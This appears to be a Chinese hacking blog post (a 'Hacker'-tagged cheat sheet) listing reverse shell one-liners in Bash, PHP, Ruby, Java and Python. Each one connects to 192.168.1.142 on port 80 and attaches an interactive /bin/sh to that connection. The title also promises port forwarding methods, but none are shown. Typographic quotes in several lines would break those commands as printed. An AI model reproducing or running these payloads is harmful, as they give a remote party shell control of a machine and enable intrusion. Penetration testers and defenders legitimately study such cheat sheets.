title: 反弹shell以及端口转发的方法收集
date: 2018-08-23 16:03:29
update: ""
author: me
tags: 
- Hacker
categories: 
- Hacker
topic: ""
cover: ""
draft: false
preview: ""
top: false
type: ""
hide: false
config: null


---



## Bash

```bash
bash -i >& /dev/tcp/192.168.1.142/80 0>&1
```

```bash
exec 5<>/dev/tcp/192.168.1.142/80
cat <&5 | while read line; do $line 2>&5 >&5; done 
# or:
while read line 0<&5; do $line 2>&5 >&5; done
```

## PHP

```php
php -r ‘$sock=fsockopen(“192.168.1.142”,80);exec(“/bin/sh -i <&3 >&3 2>&3”);’
(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
```

## RUBY

```ruby
ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
```

## JAVA

```java
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()
```

## PYTHON

```python
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```
